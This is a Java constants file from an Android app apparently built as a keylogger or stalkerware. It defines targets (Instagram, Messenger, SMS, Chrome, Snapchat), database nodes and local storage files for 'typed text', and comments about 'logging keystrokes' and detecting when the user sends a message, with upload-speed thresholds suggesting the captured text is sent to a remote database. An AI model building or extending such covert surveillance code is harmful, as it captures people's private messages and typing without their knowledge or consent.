package androidaid.android.com.androidaid.program_flow;

import java.util.ArrayList;

public class Constants {
    public static String NOTIFICATION_INSTAGRAM = "NOTIFICATION_INSTAGRAM";
    public static String NOTIFICATION_FACEBOOK = "NOTIFICATION_FACEBOOK";

    public static final String PACKAGE_NAME_INSTAGRAM = "com.instagram.android";
    public static final String PACKAGE_NAME_MESSENGER = "com.facebook.orca";
    public static final String PACKAGE_NAME_SMS = "com.google.android.apps.messaging";

    public static final String DATABASE_NODE_GENERAL_TEXT = "general_text"; //node in the database where all of the text from all of the fields from all of the apps is cluttered together (except fb and instagram)
    public static final String DATABASE_NODE_FIELD_TEXT_MESSENGER = "field_text_messenger"; //node in the database where typed text from messenger is stored
    public static final String DATABASE_NODE_FIELD_TEXT_INSTAGRAM = "field_text_instagram"; //node in the database where typed text from instagram is stored
    public static final String DATABASE_NODE_FIELD_TEXT_SMS = "field_text_SMS";
    public static final String DATABASE_SUBNODE_EXTRA_CONVERSATION_DATA = "extra_conversation_data";
    public static final String DATABASE_SUBNODE_TYPED_TEXT = "typed_text";

    public static String INSTAGRAM_CONVERSATION_FIELD_DEFAULT_TEXT = "Message…"; //for MAS to find out when the user sends out a message. When the user sends a message, the text of Instagram's converstion EditText is going to be set to this value

    public static String MESSENGER_CONVERSATION_FIELD_DEFAULT_TEXT = "Aa"; //for MAS to find out when the user sends out a message. When the user sends a message from messenger, the text of messenger's conversation EditText is going to be set to this value
    //public static String SMS_CONVERSAION_FIELD_DEFAULT_TEXT = "Besedilno"

    public static String[] DATABASE_FORBIDDEN_FIELD_TEXT_VALUES = new String[] { //these string mustn't be sent to field_text node in the database
            "Aa", "Message…"
    };

    public static String STORAGE_TEXT_STARTEND_SEPARATOR = "|||";
    public static String REGEX_STORAGE_TEXT_STARTEND_SEPARATOR = "\\|\\|\\|";
    public static String STORAGE_TEXT_SEMISEPARATOR = "||";
    public static String REGEX_STORAGE_TEXT_SEMISEPARATOR = "\\|\\|";
    public static String STORAGE_TEXT_ADDITIONAL_SCREEN_INFORMATION_SEPARATOR = "|";
    public static String REGEX_STORAGE_ADDITIONAL_SCREEN_INFORMATION_SEPARATOR = "\\|";

    //internal memory locations for logging keystrokes
    public static String STORAGE_FIELD_TEXT_MESSENGER = DATABASE_NODE_FIELD_TEXT_MESSENGER;
    public static String STORAGE_FIELD_TEXT_INSTAGRAM = DATABASE_NODE_FIELD_TEXT_INSTAGRAM; //internal storage file location for storing instagram field text which is typed if user is offline or connection is too slow
    public static String STORAGE_FIELD_TEXT_CHROME = "field_text_chrome";
    public static String STORAGE_FIELD_TEXT_SNAPCHAT = "field_text_snapchat";
    public static String STORAGE_FIELD_TEXT_SMS = DATABASE_NODE_FIELD_TEXT_SMS;
    public static String STORAGE_GENERAL_TEXT_FILE_LOCATION = DATABASE_NODE_GENERAL_TEXT; //internal storage file location for storing general text which is typed if user is offline or connection is too slow

    public static int INTERNET_MINIMUM_ALLOWED_DOWNLOAD_SPEED = 3; //measured in Mbps
    public static int INTERNET_MINIMUM_ALLOWED_UPLOAD_SPEED = 1; //measured in Mbps

    public static final String SOURCE_INSTAGRAM = "INSTAGRAM";
    public static final String SOURCE_MESSENGER = "MESSENGER";
    public static final String SOURCE_SMS = "SMS";
    public static final String SOURCE_UNKNOWN = "UNKNOWN";

}
